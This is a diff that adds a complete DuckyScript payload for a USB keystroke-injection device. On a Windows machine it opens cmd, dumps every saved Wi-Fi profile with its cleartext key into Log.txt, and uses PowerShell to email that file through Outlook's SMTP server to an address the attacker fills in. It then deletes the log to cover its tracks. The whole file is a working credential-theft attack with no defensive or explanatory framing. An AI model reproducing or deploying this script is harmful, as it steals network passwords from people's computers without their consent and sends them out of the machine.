@@ -1,0 +1,35 @@
+DELAY 1000
+WINDOWS r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 700
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear | C:\Windows\System32\findstr.exe "SSID-Name sselinhalt" >> Log.txt
+ENTER
+DELAY 5000
+STRING powershell
+ENTER
+STRING $SMTPInfo = New-Object Net.Mail.SmtpClient('smtp-mail.outlook.com', 587)
+ENTER
+STRING $SMTPInfo.EnableSSL = $true
+ENTER
+STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('yourMail@outlook.com', 'your Password')
+ENTER
+STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
+ENTER
+STRING $ReportEmail.From = 'yourMail@outlook.com'
+ENTER
+STRING $ReportEmail.To.Add('yourMail@outlook.com')
+ENTER
+STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
+ENTER
+STRING $SMTPInfo.Send($ReportEmail)
+ENTER
+DELAY 3000
+STRING del Log.txt
+ENTER
+DELAY 500
+STRING exit
+ENTER
+STRING exit
+ENTER
